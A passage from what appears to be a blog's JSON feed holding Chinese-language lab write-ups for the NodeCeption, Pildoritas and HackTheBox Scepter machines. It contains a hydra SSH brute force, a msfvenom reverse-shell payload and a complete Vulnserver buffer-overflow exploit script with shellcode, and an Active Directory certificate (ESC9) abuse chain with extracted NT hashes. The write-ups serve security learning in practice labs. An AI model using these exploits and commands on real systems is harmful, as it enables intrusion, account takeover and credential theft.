ALL\n```\n\n但是执行时需要我们提供密码\n\n尝试`hydra`爆破\n\n```bash\n➜  NodeCeption hydra -l thl -P /usr/share/wordlists/rockyou.txt -t 8 192.168.56.88 ssh\nHydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-07-25 20:54:04\n[DATA] max 8 tasks per 1 server, overall 8 tasks, 14344399 login tries (l:1/p:14344399), ~1793050 tries per task\n[DATA] attacking ssh://192.168.56.88:22/\n[22][ssh] host: 192.168.56.88   login: thl   password: basketball\n1 of 1 target successfully completed, 1 valid password found\nHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-07-25 20:54:27\n```\n\n得到密码 `basketball`\n\n结束\n\n```bash\nthl@nodeception:~$ sudo cat /root/root.txt\n[sudo] password for thl: \nTHL_xxxxxxxxxxxxxxxxxxx\n```\n\n## 总结\n\n梭哈",
            "url": "https://www.sunsetaction.top/2025/07/25/TheHackersLabsNodeCeption",
            "title": "TheHackersLabs - NodeCeption",
            "summary": "NodeCeption https://labs.thehackerslabs.com/machine/118 Recon PortScan 枚举测试 8765 Apache默认页面 5678 n8n n8n 可以反弹 shell，但是要进入后台，并且需要邮箱和密码 密码爆破 我么寻找一下哪里能找到...",
            "date_modified": "2025-07-25T00:00:00.000Z",
            "author": {
                "name": "Sunset",
                "url": "https://www.sunsetaction.top/about"
            },
            "tags": [
                "靶机",
                "TheHackersLabs",
                "Linux",
                "n8n",
                "hydra"
            ]
        },
        {
            "id": "https://www.sunsetaction.top/2025/07/24/TheHackersLabsPildoritas",
            "content_html": "\n# Pildoritas\n\n> https://labs.thehackerslabs.com/machine/67\n> \n\n![image.png](/post-images/TheHackersLabsPildoritas/image.png)\n\n## Recon\n\n### PortScan\n\n```bash\n➜  Pildoritas nmap -sn 192.168.56.0/24               \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-24 22:00 CST\nNmap scan report for 192.168.56.1\nHost is up (0.00052s latency).\nMAC Address: 0A:00:27:00:00:09 (Unknown)\nNmap scan report for 192.168.56.2\nHost is up (0.00037s latency).\nMAC Address: 08:00:27:31:BB:E1 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nNmap scan report for 192.168.56.93\nHost is up (0.00069s latency).\nMAC Address: 08:00:27:83:27:28 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nNmap scan report for 192.168.56.5\nHost is up.\nNmap done: 256 IP addresses (4 hosts up) scanned in 6.09 seconds\n```\n\n这次不打 `AD` 域\n\n```bash\n➜  Pildoritas nmap -sT -min-rate 10000 -p- 192.168.56.93    \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-24 22:00 CST\nWarning: 192.168.56.93 giving up on port because retransmission cap hit (10).\nNmap scan report for 192.168.56.93\nHost is up (0.00029s latency).\nNot shown: 65267 closed tcp ports (conn-refused), 257 filtered tcp ports (no-response)\nPORT      STATE SERVICE\n80/tcp    open  http\n135/tcp   open  msrpc\n139/tcp   open  netbios-ssn\n445/tcp   open  microsoft-ds\n9999/tcp  open  abyss\n49152/tcp open  unknown\n49153/tcp open  unknown\n49154/tcp open  unknown\n49155/tcp open  unknown\n49156/tcp open  unknown\n49157/tcp open  unknown\nMAC Address: 08:00:27:83:27:28 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 19.78 seconds\n```\n\n```bash\n➜  Pildoritas nmap -sT -A -p $(cat port | awk -F '/' '{print $1}' | paste -sd ',') 192.168.56.93\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-24 22:11 CST                                                                                                                                 \nNmap scan report for 192.168.56.93                                                              \nHost is up (0.00035s latency).\n\nPORT     STATE SERVICE       VERSION\n80/tcp   open  http          Microsoft IIS httpd 7.0\n|_http-title: 404: archivo o directorio no encontrado.\n|_http-server-header: Microsoft-IIS/7.0\n| http-methods: \n|_  Potentially risky methods: TRACE\n135/tcp  open  msrpc         Microsoft Windows RPC\n139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn\n445/tcp  open  microsoft-ds?\n9999/tcp open  vulnserver    Vulnserver\nMAC Address: 08:00:27:83:27:28 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose\nRunning: Microsoft Windows 2008|7|Vista|8.1\nOS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_vista cpe:/o:microsoft:windows_8.1\nOS details: Microsoft Windows Vista SP2 or Windows 7 or Windows Server 2008 R2 or Windows 8.1\nNetwork Distance: 1 hop\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-security-mode: \n|   2:0:2: \n|_    Message signing enabled but not required\n|_clock-skew: 6h59m57s\n| smb2-time: \n|   date: 2025-07-24T21:12:18\n|_  start_date: 2025-07-24T20:57:33\n|_nbstat: NetBIOS name: WIN-LVJNVVHBWSR, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:83:27:28 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.35 ms 192.168.56.93\n```\n\n### 枚举测试\n\n`SMB` 匿名枚举\n\n```bash\n➜  Pildoritas smbclient -L 192.168.56.93 -U anonymous\nPassword for [WORKGROUP\\anonymous]:\nsession setup failed: NT_STATUS_LOGON_FAILUR\n```\n\n## Vulnserver\n\n从`nmap` 中的扫描结果能知道搭建着 `Vulnserver`\n\n项目链接：https://github.com/stephenbradshaw/vulnserver\n\n```bash\n➜  Pildoritas nc 192.168.56.93 9999 \nWelcome to Vulnerable Server! Enter HELP for help.\n```\n\n直接从网上找 `POC` ：https://forum.butian.net/share/4013\n\n将里面的`payload` 换成自己的就行\n\n```bash\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.5 LPORT=1234 -f c -e x86/shikata\\_ga\\_nai -b \"\\\\x00\" -f python -v shellcode\n```\n\n```bash\n#!/usr/bin/python\n\nimport socket\nimport sys\nfrom struct import pack\n\ntry:\n    server = sys.argv[1]\n    port = 9999\n    size = 2006\n\n    shellcode = b\"\\x90\" * 20\n    \n    // 替换\n    shellcode += b\"\\xd9\\xc0\\xd9\\x74\\x24\\xf4\\x58\\x31\\xc9\\xbb\\x6b\"\n    shellcode += b\"\\xc5\\x71\\xf0\\xb1\\x59\\x31\\x58\\x19\\x83\\xe8\\xfc\"\n    shellcode += b\"\\x03\\x58\\x15\\x89\\x30\\x8d\\x18\\xc2\\xbb\\x6e\\xd9\"\n    shellcode += b\"\\xbc\\x32\\x8b\\xe8\\xee\\x21\\xdf\\x59\\x3e\\x21\\x8d\"\n    shellcode += b\"\\x51\\xb5\\x67\\x26\\x5b\\x36\\x0c\\x34\\xb3\\xc7\\xa4\"\n    shellcode += b\"\\xf3\\xe5\\xe6\\x0a\\xaf\\xd6\\x69\\xf7\\xb2\\x0a\\x49\"\n    shellcode += b\"\\xc6\\x7c\\x5f\\x88\\x0f\\xcb\\x15\\x65\\xdd\\x9b\\x5e\"\n    shellcode += b\"\\x2b\\xf2\\xa8\\x23\\xf7\\xf3\\x7e\\x28\\x47\\x8c\\xfb\"\n    shellcode += b\"\\xef\\x33\\x20\\x05\\x20\\x30\\xf0\\x1d\\x4b\\x1e\\x21\"\n    shellcode += b\"\\x1f\\x98\\xce\\xa4\\xd6\\x6a\\xd2\\x97\\x17\\xdb\\xa1\"\n    shellcode += b\"\\xec\\x6c\\xdd\\x63\\x3d\\xb3\\x1f\\x44\\x33\\x9f\\xa1\"\n    shellcode += b\"\\x9d\\x74\\x3f\\xd4\\xd5\\x86\\xc2\\xef\\x2e\\xf4\\x18\"\n    shellcode += b\"\\x65\\xb0\\x5e\\xea\\xdd\\x14\\x5e\\x3f\\xbb\\xdf\\x6c\"\n    shellcode += b\"\\xf4\\xcf\\x87\\x70\\x0b\\x03\\xbc\\x8d\\x80\\xa2\\x12\"\n    shellcode += b\"\\x04\\xd2\\x80\\xb6\\x4c\\x80\\xa9\\xef\\x28\\x67\\xd5\"\n    shellcode += b\"\\xef\\x95\\xd8\\x73\\x64\\x37\\x0e\\x03\\x85\\xc7\\x2f\"\n    shellcode += b\"\\x59\\x11\\x0b\\xe2\\x62\\xe1\\x03\\x75\\x10\\xd3\\x8c\"\n    shellcode += b\"\\x2d\\xbe\\x5f\\x44\\xe8\\x39\\xd6\\x42\\x0b\\x95\\x50\"\n    shellcode += b\"\\x02\\xf5\\x16\\xa0\\x0a\\x32\\x42\\xf0\\x24\\x93\\xeb\"\n    shellcode += b\"\\x9b\\xb4\\x1c\\x3e\\x31\\xbf\\x8a\\x01\\x6d\\x87\\x4f\"\n    shellcode += b\"\\xea\\x6f\\xf8\\x4b\\x38\\xe6\\x1e\\x03\\xec\\xa8\\x8e\"\n    shellcode += b\"\\xe4\\x5c\\x08\\x7f\\x8d\\xb6\\x87\\xa0\\xad\\xb8\\x42\"\n    shellcode += b\"\\xc9\\x44\\x57\\x3a\\xa1\\xf0\\xce\\x67\\x39\\x60\\x0e\"\n    shellcode += b\"\\xb2\\x47\\xa2\\x84\\x36\\xb7\\x6d\\x6d\\x33\\xab\\x9a\"\n    shellcode += b\"\\x0a\\xbb\\x33\\x5b\\xbf\\xbb\\x59\\x5f\\x69\\xec\\xf5\"\n    shellcode += b\"\\x5d\\x4c\\xda\\x59\\x9d\\xbb\\x59\\x9d\\x61\\x3a\\x6b\"\n    shellcode += b\"\\xd5\\x54\\xa8\\xd3\\x81\\x98\\x3c\\xd3\\x51\\xcf\\x56\"\n    shellcode += b\"\\xd3\\x39\\xb7\\x02\\x80\\x5c\\xb8\\x9e\\xb5\\xcc\\x2d\"\n    shellcode += b\"\\x21\\xef\\xa1\\xe6\\x49\\x0d\\x9f\\xc1\\xd5\\xee\\xca\"\n    shellcode += b\"\\x51\\x11\\x10\\x88\\x7d\\xba\\x78\\x72\\x3e\\x3a\\x78\"\n    shellcode += b\"\\x18\\xbe\\x6a\\x10\\xd7\\x91\\x85\\xd0\\x18\\x38\\xce\"\n    shellcode += b\"\\x78\\x92\\xad\\xbc\\x19\\xa3\\xe7\\x61\\x87\\xa4\\x04\"\n    shellcode += b\"\\xba\\x38\\xde\\x65\\x3d\\xb9\\x1f\\x6c\\x5a\\xba\\x1f\"\n    shellcode += b\"\\x90\\x5c\\x87\\xc9\\xa9\\x2a\\xc6\\xc9\\x8d\\x25\\x7d\"\n    shellcode += b\"\\x6f\\xa7\\xaf\\x7d\\x23\\xb7\\xe5\"\n\n    inputBuffer = b\"TRUN .\" + b\"\\x41\" * size + b\"\\xaf\\x11\\x50\\x62\" + shellcode\n\n    buf = inputBuffer\n\n    print(\"Sending evil buffer...\")\n\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect((server, port))\n    s.send(buf)\n    s.close()\n\n    print(\"Done!\")\n\nexcept socket.error:\n    print(\"Could not connect!\")\n```\n\n运行后成功拿到 `Shell`\n\n![image.png](/post-images/TheHackersLabsPildoritas/image1.png)\n\n直接就是`SYSTEM` 权限\n\n```bash\nmeterpreter > ls\nListing: C:\\Users\\Administrador\\Desktop\n=======================================\n\nMode              Size   Type  Last modified              Name\n----              ----   ----  -------------              ----\n100666/rw-rw-rw-  282    fil   2024-07-22 00:38:48 +0800  desktop.ini\n100666/rw-rw-rw-  1646   fil   2024-07-22 01:00:39 +0800  essfunc.c\n100666/rw-rw-rw-  16601  fil   2024-07-22 01:00:11 +0800  essfunc.dll\n100666/rw-rw-rw-  36     fil   2024-07-22 01:46:33 +0800  root.txt\n100666/rw-rw-rw-  9033   fil   2024-07-22 01:00:31 +0800  vulnserver.c\n100777/rwxrwxrwx  29624  fil   2024-07-22 00:59:45 +0800  vulnserver.exe\n\nmeterpreter > getuid\nServer username: NT AUTHORITY\\SYSTEM\n\nmeterpreter > cat root.txt\nbe3751d9c6dxxxxxxxxxxxxxxxxxxxxxxx  -\n\nmeterpreter > cat user.txt\n3163xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx  -\n```\n\n## 总结\n\n不清楚是否是让直接梭哈\n\n还是有预期做法\n\n感觉怪怪的",
            "url": "https://www.sunsetaction.top/2025/07/24/TheHackersLabsPildoritas",
            "title": "TheHackersLabs - Pildoritas",
            "summary": "Pildoritas https://labs.thehackerslabs.com/machine/67 Recon PortScan 这次不打 AD 域 枚举测试 SMB 匿名枚举 Vulnserver 从nmap 中的扫描结果能知道搭建着 Vulnserver 项目链接：https://git...",
            "date_modified": "2025-07-24T00:00:00.000Z",
            "author": {
                "name": "Sunset",
                "url": "https://www.sunsetaction.top/about"
            },
            "tags": [
                "靶机",
                "TheHackersLabs",
                "Vulnserver"
            ]
        },
        {
            "id": "https://www.sunsetaction.top/2025/07/24/HackTheBoxMachine - Scepter",
            "content_html": "# Machine - Scepterl\n\n> https://app.hackthebox.com/machines/Scepter | `Hard`\n> \n\nPS：一直以为 Season 过了之后就不能白嫖靶机了…导致错过了两周的靶机…呜呜呜\n\n## 前期踩点\n\n```bash\n➜  Scepter nmap -sT -min-rate 10000 -p- 10.10.11.65        \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-24 10:18 EDT\nNmap scan report for 10.10.11.65\nHost is up (0.30s latency).\nNot shown: 65306 filtered tcp ports (no-response), 224 closed tcp ports (conn-refused)\nPORT    STATE SERVICE\n53/tcp  open  domain\n111/tcp open  rpcbind\n135/tcp open  msrpc\n139/tcp open  netbios-ssn\n445/tcp open  microsoft-ds\n\nNmap done: 1 IP address (1 host up) scanned in 66.89 seconds\n```\n\n`Windows` 靶机的端口，但不一定是域控主机（PS:后面才知道我扫描出来的端口shao）\n\n```bash\n➜  Scepter nmap -sT -A -T4 -O -p 53,111,135,139,445 10.10.11.65\nNmap scan report for 10.10.11.65\nHost is up (0.40s latency).\n\nPORT    STATE SERVICE       VERSION\n53/tcp  open  domain        Simple DNS Plus\n111/tcp open  rpcbind?\n| rpcinfo:\n|   program version    port/proto  service\n|   100003  2,3         2049/udp6  nfs\n|   100003  2,3,4       2049/tcp6  nfs\n|   100003  4           2049/tcp   nfs\n|   100005  1,2,3       2049/tcp   mountd\n|   100005  1,2,3       2049/tcp6  mountd\n|   100005  1,2,3       2049/udp   mountd\n|   100005  1,2,3       2049/udp6  mountd\n|   100021  1,2,3,4     2049/tcp   nlockmgr\n|   100021  1,2,3,4     2049/tcp6  nlockmgr\n|   100021  1,2,3,4     2049/udp   nlockmgr\n|   100021  1,2,3,4     2049/udp6  nlockmgr\n|   100024  1           2049/tcp   status\n|   100024  1           2049/tcp6  status\n|   100024  1           2049/udp   status\n|_  100024  1           2049/udp6  status\n135/tcp open  msrpc         Microsoft Windows RPC\n139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn\n445/tcp open  microsoft-ds?\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nAggressive OS guesses: Microsoft Windows Server 2019 (96%), Microsoft Windows 10 1709 - 1909 (93%), Microsoft Windows Server 2012 (93%), Microsoft Windows Vista SP1 (92%), Microsoft Windows Longhorn (92%), Micro\nsoft Windows 10 1709 - 1803 (91%), Microsoft Windows 10 1809 - 2004 (91%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows Server 2012 R2 Update 1 (91%), Microsoft Windows Server 2016 build 10586 - 143\n93 (91%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-time:\n|   date: 2025-04-24T22:05:35\n|_  start_date: N/A\n|_clock-skew: 7h40m16s\n| smb2-security-mode:\n|   3:1:1:\n|_    Message signing enabled and required\n\nTRACEROUTE (using proto 1/icmp)\nHOP RTT       ADDRESS\n1   464.44 ms 10.10.16.1\n2   291.53 ms 10.10.11.65\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 251.59 seconds\n```\n\n## NFS\n\n```bash\nrpcdump.py scepter.htb -target-ip 10.10.11.65\n```\n\n很多的信息，尝试从里面获取有用的信息，结果保存在 `rpcdump_resule.txt`\n\n主机为 `DC01.scepter.htb` ，那就能确定是域控了\n\nNMAP 中扫描出了靶机开启了 NFS，尝试一下匿名访问。\n\n```bash\n➜  Scepter showmount -e 10.10.11.65\nExport list for 10.10.11.65:\n/helpdesk (everyone)\n\n➜  Scepter mkdir nfs\n➜  Scepter sudo mount -t nfs 10.10.11.65:/helpdesk /root/Desktop/test/Scepter/nfs\n\n➜  Scepter cd nfs   \n➜  nfs ls\nbaker.crt  baker.key  clark.pfx  lewis.pfx  scott.pfx\n```\n\n## To D.baker\n\n使用 openssl 查看 `baker.crt` 的内容\n\n```bash\n➜  nfs_backup openssl x509 -in baker.crt -text -noout\nCertificate:                                                                                                                                                                                                    \n    Data:                                 \n        Version: 3 (0x2)                                                                                                                                                                                        \n        Serial Number:            \n            62:00:00:00:32:e1:a5:c3:91:51:31:09:7b:00:00:00:00:00:32\n        Signature Algorithm: sha256WithRSAEncryption \n        Issuer: DC=htb, DC=scepter, CN=scepter-DC01-CA\n        Validity                       \n            Not Before: Nov  2 01:13:46 2024 GMT                                                        \n            Not After : Nov  2 01:13:46 2025 GMT\n        Subject: DC=htb, DC=scepter, CN=Users, CN=d.baker, emailAddress=d.baker@scepter.htb\n        Subject Public Key Info:         \n            Public Key Algorithm: rsaEncryption\n                Public-Key: (2048 bit)                                         \n```\n\n尝试生成 `pfx` 文件，用于认证的密码是 `newpassword` （暂时不知道如何获得，弱密码？），新设置密码为空密码\n\n```bash\n➜  nfs_backup openssl pkcs12 -export -out baker.pfx -inkey baker.key -in baker.crt\nEnter pass phrase for baker.key:\nEnter Export Password:\nVerifying - Enter Export Password:\n```\n\n通过 `certipy-ad` 提取用户 hash\n\n```bash\n➜  Scepter sudo ntpdate 10.10.11.65 | certipy-ad auth -pfx baker.pfx -dc-ip 10.10.11.65 -domain scepter.htb -username d.baker\nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[*] Using principal: d.baker@scepter.htb\n[*] Trying to get TGT...\n[*] Got TGT\n[*] Saved credential cache to 'd.baker.ccache'\n[*] Trying to retrieve NT hash for 'd.baker'\n[*] Got hash for 'd.baker@scepter.htb': aad3b435b51404eeaad3b435b51404ee:18b5fb0d99e7a475316213c15b6f22ce\n```\n\n```bash\naad3b435b51404eeaad3b435b51404ee:18b5fb0d99e7a475316213c15b6f22ce\n```\n\n检查密码有效性\n\n```bash\n➜  Scepter nxc smb 10.10.11.65 -u d.baker -H 18b5fb0d99e7a475316213c15b6f22ce\nSMB         10.10.11.65     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:scepter.htb) (signing:True) (SMBv1:False)\nSMB         10.10.11.65     445    DC01             [+] scepter.htb\\d.baker:18b5fb0d99e7a475316213c15b6f22ce \n```\n\n```bash\n➜  Scepter nxc ldap 10.10.11.65 -u d.baker -H 18b5fb0d99e7a475316213c15b6f22ce\nSMB         10.10.11.65     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:scepter.htb) (signing:True) (SMBv1:False)\nLDAP        10.10.11.65     389    DC01             [+] scepter.htb\\d.baker:18b5fb0d99e7a475316213c15b6f22ce \n```\n\n```bash\n➜  Scepter bloodhound-python -u 'd.baker' -d 'scepter.htb' -ns 10.10.11.65 --zip -c All -dc 'DC01.scepter.htb' --hashes 'aad3b435b51404eeaad3b435b51404ee:18b5fb0d99e7a475316213c15b6f22ce'   \nINFO: Found AD domain: scepter.htb\nINFO: Getting TGT for user\nWARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: unpack requires a buffer of 4 bytes\nINFO: Connecting to LDAP server: DC01.scepter.htb\nINFO: Found 1 domains\nINFO: Found 1 domains in the forest\nINFO: Found 1 computers\nINFO: Connecting to LDAP server: DC01.scepter.htb\nINFO: Found 11 users\nINFO: Found 57 groups\nINFO: Found 2 gpos\nINFO: Found 3 ous\nINFO: Found 19 containers\nINFO: Found 0 trusts\nINFO: Starting computer enumeration with 10 workers\nINFO: Querying computer: dc01.scepter.htb\nWARNING: DCE/RPC connection failed: The NETBIOS connection with the remote host timed out.\nINFO: Done in 00M 27S\nINFO: Compressing output into 20250425062047_bloodhound.zip\n```\n\n## To A.carter\n\n### 权限滥用\n\nBloodHound分析，`d.baker` 属于 `STAFF ACCESS CERTICICATE` 的\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Scepter/image.png)\n\n因为这个关系，`d.baker` 可以修改 `a.carter` 的密码\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Scepter/image1.png)\n\n修改密码 `123456`\n\n```bash\n➜  nfs_backup changepasswd.py 'scepter.htb/a.carter@10.10.11.65' -newpass 123456 -altuser 'd.baker' -althash 'aad3b435b51404eeaad3b435b51404ee:18b5fb0d99e7a475316213c15b6f22ce' -reset\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Setting the password of scepter.htb\\a.carter as scepter.htb\\d.baker\n[*] Connecting to DCE/RPC as scepter.htb\\d.baker\n[*] Password was changed successfully.\n[!] User no longer has valid AES keys for Kerberos, until they change their password again.\n```\n\n检验是否修改成功\n\n```bash\n➜  nfs_backup nxc smb 10.10.11.65 -u a.carter -p 123456       \nSMB         10.10.11.65     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:scepter.htb) (signing:True) (SMBv1:False)\nSMB         10.10.11.65     445    DC01             [+] scepter.htb\\a.carter:123456 \n```\n\n## To H.brown\n\n通过 BloodHound 查看一下 a.carter 的权限。对 `STAFF ACCESS CERTIFICATE` 有 GenericAll 权限\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Scepter/image2.png)\n\n赋予 a.carter 对`STAFF ACCESS CERTIFICATE`  `Fullcontrol` 权限\n\n```bash\n➜  nfs_backup dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal 'a.carter' -target-dn 'OU=STAFF ACCESS CERTIFICATE,DC=SCEPTER,DC=HTB' 'scepter.htb'/'a.carter':'123456'\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] NB: objects with adminCount=1 will no inherit ACEs from their parent container/OU\n[*] DACL backed up to dacledit-20250425-071815.bak\n[*] DACL modified successfully!\n```\n\n```bash\n➜  Scepter bloodhound-python -u 'a.carter' -p '123456' -d 'scepter.htb' -ns 10.10.11.65 --zip -c All -dc 'DC01.scepter.htb' \nINFO: Found AD domain: scepter.htb\nINFO: Getting TGT for user\nWARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: unpack requires a buffer of 4 bytes\nINFO: Connecting to LDAP server: DC01.scepter.htb\nINFO: Found 1 domains\nINFO: Found 1 domains in the forest\nINFO: Found 1 computers\nINFO: Connecting to LDAP server: DC01.scepter.htb\nINFO: Found 11 users\nINFO: Found 57 groups\nINFO: Found 2 gpos\nINFO: Found 3 ous\nINFO: Found 19 containers\nINFO: Found 0 trusts\nINFO: Starting computer enumeration with 10 workers\nINFO: Querying computer: dc01.scepter.htb\nINFO: Done in 00M 31S\nINFO: Compressing output into 20250425071924_bloodhound.zip\n```\n\n粗略一看没找到链子，先找找下一个目标账户，查看了用户后发现 `h.brown` 是远程管理组成员，暂且将其作为目标用户。\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Scepter/image3.png)\n\n### ESC9\n\n一开始给我们提供的就是证书来获得用户，所以知识点可能在 AD CS\n\n使用 certipy 收集数据\n\n```bash\n➜  Scepter certipy-ad find -u a.carter@scepter.htb -p 123456 -dc-ip 10.10.11.65 -bloodhound                                                                                     \nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[*] Finding certificate templates\n[*] Found 35 certificate templates\n[*] Finding certificate authorities\n[*] Found 1 certificate authority\n[*] Found 13 enabled certificate templates\n[*] Trying to get CA configuration for 'scepter-DC01-CA' via CSRA\n[!] Got error while trying to get CA configuration for 'scepter-DC01-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.\n[*] Trying to get CA configuration for 'scepter-DC01-CA' via RRP\n[!] Got error while trying to get CA configuration for 'scepter-DC01-CA' via RRP: The NETBIOS connection with the remote host timed out.\n[!] Failed to get CA configuration for 'scepter-DC01-CA'\n[*] Saved BloodHound data to '20250425111914_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @ly4k\n```\n\nESC4 也有，但是我们当前的用户无法实现。最后发现 `ESC9` 貌似是我们当前可以利用的\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Scepter/image4.png)\n\n利用链接：https://www.thehacker.recipes/ad/movement/adcs/certificate-templates#esc9-no-security-extension\n\n该组织属性：\n\n| 属性 | 值 |\n| --- | --- |\n| Any Purpose | False |\n| Authorized Signatures Required | 0 |\n| Certificate Authorities | scepter-DC01-CA |\n| Certificate Name Flag | SubjectRequireEmail<br>SubjectRequireDnsAsCn<br>SubjectAltRequireEmail |\n| Client Authentication | True |\n| Display Name | StaffAccessCertificate |\n| Enabled | True |\n| Enrollee Supplies Subject | False |\n| Enrollment Agent | False |\n| Enrollment Flag | NoSecurityExtension<br>AutoEnrollment |\n| Extended Key Usage | Client Authentication<br>Server Authentication |\n| Minimum RSA Key Length | 2,048 |\n| Private Key Flag | 16842752 |\n| Renewal Period | 6 weeks |\n| Requires Key Archival | False |\n| Requires Manager Approval | False |\n| Template Name | StaffAccessCertificate |\n| Validity Period | 99 years |\n| Domain | SCEPTER.HTB |\n| Type | Certificate Template |\n\n来自上面的链接：在此方案中，user1 对 user2 具有 `GenericWrite`，并希望入侵 user3。允许 user2 注册一个易受攻击的模板，该模板在 `msPKI-Enrollment-Flag` 值中指定 `CT_FLAG_NO_SECURITY_EXTENSION` 标志。\n\n```bash\ncertipy-ad shadow auto -username \"a.carter@scepter.htb\" -p \"123456\" -account d.baker -dc-ip 10.10.11.65\ncertipy-ad account update -username \"a.carter@scepter.htb\" -p \"123456\" -user d.baker -upn h.brown -dc-ip 10.10.11.65\ncertipy-ad req -username \"d.baker@scepter.htb\" -hashes 18b5fb0d99e7a475316213c15b6f22ce -target \"dc01.scepter.htb\" -ca 'scepter-DC01-CA' -template 'StaffAccessCertificate' -dc-ip 10.10.11.65\ncertipy-ad account update -username \"a.carter@scepter.htb\" -p \"123456\" -user d.baker -upn \"d.baker@scepter\" -dc-ip 10.10.11.65\ncertipy-ad auth -pfx 'h.brown.pfx' -domain \"scepter.htb\" -dc-ip 10.10.11.65\n```\n\n执行到第三条的时候出现了如下错误\n\n```bash\n➜  ADCS certipy-ad req -username \"d.baker@scepter.htb\" -hashes 18b5fb0d99e7a475316213c15b6f22ce -target \"dc01.scepter.htb\" -ca 'scepter-DC01-CA' -template 'StaffAccessCertificate' -dc-ip 10.10.11.65\n\nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[*] Requesting certificate via RPC\n[-] Got error while trying to request certificate: code: 0x80094812 - CERTSRV_E_SUBJECT_EMAIL_REQUIRED - The email name is unavailable and cannot be added to the Subject or Subject Alternate name.\n[*] Request ID is 38\nWould you like to save the private key? (y/N) Y\n[*] Saved private key to 38.key\n[-] Failed to request certificate\n```\n\n表明在证书申请过程中，**证书颁发请求**中需要包含 **email** 信息，但在你的请求中，**email 信息缺失或无法获取**。具体来说，错误 `CERTSRV_E_SUBJECT_EMAIL_REQUIRED` 指明，证书模板要求在 **Subject** 或 **Subject Alternative Name (SAN)** 中必须包含有效的 email 地址。\n\n询问**佬**们后得知可以通过 `BloodyAD` 来修改，将 d.baker 的\n\n```bash\nbloodyAD -d scepter.htb -u a.carter -p 123456 --host dc01.scepter.htb set object d.baker mail -v h.brown@scepter.htb\n```\n\n那么命令就变为\n\n```bash\ncertipy-ad shadow auto -username \"a.carter@scepter.htb\" -p \"123456\" -account d.baker -dc-ip 10.10.11.65\ncertipy-ad account update -username \"a.carter@scepter.htb\" -p \"123456\" -user d.baker -upn h.brown -dc-ip 10.10.11.65\nbloodyAD -d scepter.htb -u a.carter -p 123456 --host dc01.scepter.htb set object d.baker mail -v h.brown@scepter.htb\ncertipy-ad req -username \"d.baker@scepter.htb\" -hashes 18b5fb0d99e7a475316213c15b6f22ce -target \"dc01.scepter.htb\" -ca 'scepter-DC01-CA' -template 'StaffAccessCertificate' -dc-ip 10.10.11.65\ncertipy-ad account update -username \"a.carter@scepter.htb\" -p \"123456\" -user d.baker -upn \"d.baker@scepter\" -dc-ip 10.10.11.65\ncertipy-ad auth -pfx 'd.baker.pfx' -domain \"scepter.htb\" -dc-ip 10.10.11.65 -username h.brown\n```\n\n最后获得 `h.brown`  的 TGT\n\n```bash\n➜  Scepter certipy-ad auth -pfx 'd.baker.pfx' -domain \"scepter.htb\" -dc-ip 10.10.11.65 -username h.brown\nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[!] Could not find identification in the provided certificate\n[*] Using principal: h.brown@scepter.htb\n[*] Trying to get TGT...\n[*] Got TGT\n[*] Saved credential cache to 'h.brown.ccache'\n[*] Trying to retrieve NT hash for 'h.brown'\n[*] Got hash for 'h.brown@scepter.htb': aad3b435b51404eeaad3b435b51404ee:4ecf5242092c6fb8c360a08069c75a0c\n```\n\n导入 TGT\n\n```bash\n➜  Scepter export KRB5CCNAME=h.brown.ccache \n```\n\n编写 `/etc/krb5.conf`\n\n```bash\n➜  Scepter cat /etc/krb5.conf                                                      \n[libdefaults]\n    default_realm = scepter.HTB\n    dns_lookup_realm = false\n    dns_lookup_kdc = true\n\n[realms]\n    